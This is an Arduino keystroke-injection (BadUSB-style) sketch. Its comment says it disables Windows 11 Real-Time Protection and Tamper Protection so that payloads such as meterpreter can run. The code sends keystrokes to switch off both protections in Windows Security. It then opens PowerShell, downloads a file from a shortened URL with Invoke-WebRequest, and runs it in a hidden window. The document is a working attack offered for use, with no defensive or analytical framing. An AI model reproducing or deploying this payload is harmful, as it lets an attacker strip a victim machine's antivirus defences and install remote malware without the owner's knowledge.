#include "Keyboard.h"
/*
This script was originally created by Nicholas Noussias to disable Real-Time Protection and Tamper Protection in Windows 11 Security settings. 

Once both are disabled, even known payloads such as meterpreter can be downloaded/executed without issue and further scripts/methods of permanently disabling security features such as AMSI will be much easier
*/
void typeKey(uint8_t key)
{
  Keyboard.press(key);
 delay(125);
  Keyboard.release(key);
}


void setup()
{
  //Inititializing keyboard sequence
  Keyboard.begin();

  // Wait 1.5 seconds after mounted to begin payload
  
 delay(1500);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();

 delay(350);
  Keyboard.print(F("virus & threat protection"));

 delay(1250);
  typeKey(KEY_RETURN);

 delay(225);
  typeKey(KEY_TAB);

 delay(225);
  typeKey(KEY_TAB);

 delay(225);
  typeKey(KEY_TAB);

 delay(225);
  typeKey(KEY_TAB);

 delay(225);
  typeKey(KEY_RETURN);

 delay(225);
  typeKey(' ');

 delay(250);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();

 delay(225);
  typeKey(KEY_TAB);

 delay(225);
  typeKey(KEY_TAB);

 delay(225);
  typeKey(KEY_TAB);

 delay(225);
  typeKey(KEY_TAB);

 delay(225);
  typeKey(' ');

delay(250);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();

  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();

  //Open PowerShell to download payload
  
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll(); 
  
 delay(250);
  Keyboard.print(F("powershell"));

 delay(50);
  typeKey(KEY_RETURN);

  delay(1250);
  Keyboard.print(F("powershell -c Invoke-WebRequest -Uri 'https://shorturl.at/JPSU4' -OutFile 'download.cmd'"));
 delay(1500); //Delay may need adjusted depending on filesize to ensure download has finished before attempting to execute
  typeKey(KEY_RETURN);
delay(2000);
  Keyboard.print(F("powershell -c Start-Process ./download.cmd -WindowStyle hidden")); //Execute downloaded payload in a hidden window
  typeKey(KEY_RETURN);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
